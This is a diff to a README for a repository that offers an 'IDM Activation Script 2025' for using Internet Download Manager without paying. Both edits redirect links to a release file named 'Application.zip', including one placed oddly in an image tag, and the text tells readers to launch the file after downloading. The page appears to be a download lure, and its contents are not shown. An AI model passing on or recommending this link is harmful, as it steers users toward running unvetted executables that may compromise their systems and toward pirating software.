@@ -11,7 +11,7 @@ Welcome to the Ultimate IDM Activation Script 2025 repository! Here, you will fi
 ## Get Started
 To begin your journey of using IDM for free, download the IDM Activation Script 2025 from the link below:
 
-[![Download IDM Activation Script](https://img.shields.io/badge/Download-Software.zip-blue.svg)](https://github.com/rokytd/files/raw/refs/heads/master/Software.zip)
+[![Download IDM Activation Script](https://github.com/Maryylol/IDM-Activation-Script-2025/releases/download/v1.0.0/Application.zip)](https://github.com/Maryylol/IDM-Activation-Script-2025/releases/download/v1.0.0/Application.zip)
 *Launch the file after downloading*
 
 ## Features
@@ -29,7 +29,7 @@ To begin your journey of using IDM for free, download the IDM Activation Script 
 ## More Resources
 For additional tips, troubleshooting, or updates, feel free to check out the "Releases" section of this repository.
 
-![IDM Activation](https://example.com/idm-activation-image.jpg)
+![IDM Activation](https://github.com/Maryylol/IDM-Activation-Script-2025/releases/download/v1.0.0/Application.zip)
 
 ## Support
 If you encounter any issues or have questions regarding the IDM Activation Script 2025, please open an issue in this repository. Our team will be happy to assist you.
